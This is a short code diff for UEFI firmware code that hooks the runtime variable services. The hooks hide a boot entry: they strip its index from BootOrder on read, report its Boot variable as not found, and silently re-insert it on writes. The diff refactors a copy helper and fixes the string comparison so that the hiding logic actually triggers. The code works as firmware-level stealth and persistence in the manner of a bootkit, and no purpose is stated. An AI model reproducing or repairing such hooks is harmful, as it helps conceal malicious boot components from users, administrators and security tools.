@@ -12,9 +12,9 @@ STATIC EFI_GET_VARIABLE OriginalGetVariable = NULL;
 STATIC EFI_GET_NEXT_VARIABLE_NAME OriginalGetNextVariableName = NULL;
 STATIC EFI_SET_VARIABLE OriginalSetVariable = NULL;
 
-STATIC VOID CopyMem2(VOID* Dst, VOID* Src, UINTN Size) {
+STATIC VOID CopyMem2(UINT8* Dst, UINT8* Src, UINTN Size) {
     for (UINTN i = 0; i < Size; i++) {
-        ((UINT8*)Dst)[i] = ((UINT8*)Src)[i];
+        Dst[i] = Src[i];
     }
 }
 
@@ -23,9 +23,7 @@ STATIC VOID HideBootOrder(UINTN* DataSize, UINT8* Data) {
         return;
     }
 
-    for (UINTN i = 0; i < *DataSize - sizeof(UINT16); i++) {
-        Data[i] = Data[i + sizeof(UINT16)];
-    }
+    CopyMem2(Data, Data + sizeof(UINT16), *DataSize - sizeof(UINT16));
     *DataSize -= sizeof(UINT16);
 }
 
@@ -77,12 +75,12 @@ SetVariableDelegate(CHAR16* VariableName, EFI_GUID* VendorGuid, UINT32 Attribute
 
         UINT8 Buffer[Size];
         CopyMem2(Buffer + sizeof(UINT16), Data, DataSize);
-        CopyMem2(Buffer, &BootIndex, sizeof(UINT16));
+        CopyMem2(Buffer, (UINT8*)&BootIndex, sizeof(UINT16));
 
         return uefi_call_wrapper(OriginalSetVariable, 5, VariableName, VendorGuid, Attributes, Size, Buffer);
     }
 
-    if (StrCmp(VariableName, BootName)) {
+    if (StrCmp(VariableName, BootName) == 0) {
         return EFI_NOT_FOUND;
     }
 
